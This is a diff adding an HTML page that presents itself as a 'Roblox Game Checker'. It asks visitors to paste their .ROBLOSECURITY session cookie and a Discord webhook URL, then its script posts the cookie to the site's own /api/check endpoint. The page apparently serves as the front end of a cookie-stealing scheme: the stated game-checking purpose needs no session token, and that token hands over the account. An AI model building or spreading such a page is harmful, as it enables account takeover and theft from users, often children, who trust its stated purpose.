@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Roblox Game Checker</title>
+    <meta charset="UTF-8">
+</head>
+<body style="font-family: Arial, sans-serif; max-width: 600px; margin: 50px auto; padding: 20px;">
+    <h1>🎮 Roblox Game Checker</h1>
+    <p>Check if a Roblox player has played specific games</p>
+    
+    <hr>
+    
+    <div>
+        <label><strong>Your Roblox Cookie (.ROBLOSECURITY):</strong></label><br>
+        <input type="text" id="cookie" style="width: 100%; padding: 8px; margin-top: 5px;" placeholder="Paste your cookie here">
+        <small style="color: red;">⚠️ NEVER share this with anyone</small>
+    </div>
+    
+    <br>
+    
+    <div>
+        <label><strong>Discord Webhook URL:</strong></label><br>
+        <input type="text" id="webhook" style="width: 100%; padding: 8px; margin-top: 5px;" placeholder="https://discord.com/api/webhooks/...">
+    </div>
+    
+    <br>
+    
+    <div>
+        <label><strong>Game IDs (comma separated):</strong></label><br>
+        <input type="text" id="gameIds" style="width: 100%; padding: 8px; margin-top: 5px;" placeholder="10998368079237, 920587237">
+        <small>Example: 10998368079237 = Jailbreak</small>
+    </div>
+    
+    <br>
+    
+    <button onclick="checkGames()" style="background-color: #0070f3; color: white; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer;">🚀 START CHECK</button>
+    
+    <div id="result" style="margin-top: 20px; padding: 10px; border-radius: 5px;"></div>
+    
+    <script>
+        async function checkGames() {
+            const cookie = document.getElementById('cookie').value;
+            const webhook = document.getElementById('webhook').value;
+            const gameIds = document.getElementById('gameIds').value;
+            const resultDiv = document.getElementById('result');
+            
+            if (!cookie || !webhook || !gameIds) {
+                resultDiv.innerHTML = '❌ Please fill in all fields';
+                resultDiv.style.backgroundColor = '#ffebee';
+                return;
+            }
+            
+            resultDiv.innerHTML = '⏳ Processing... Checking Roblox...';
+            resultDiv.style.backgroundColor = '#e3f2fd';
+            
+            try {
+                const response = await fetch('/api/check', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ cookie, webhook, gameIds })
+                });
+                
+                const data = await response.json();
+                
+                if (data.success) {
+                    resultDiv.innerHTML = '✅ ' + data.message;
+                    resultDiv.style.backgroundColor = '#e8f5e9';
+                } else {
+                    resultDiv.innerHTML = '❌ Error: ' + data.error;
+                    resultDiv.style.backgroundColor = '#ffebee';
+                }
+            } catch (error) {
+                resultDiv.innerHTML = '❌ Network error: ' + error.message;
+                resultDiv.style.backgroundColor = '#ffebee';
+            }
+        }
+    </script>
+</body>
+</html>
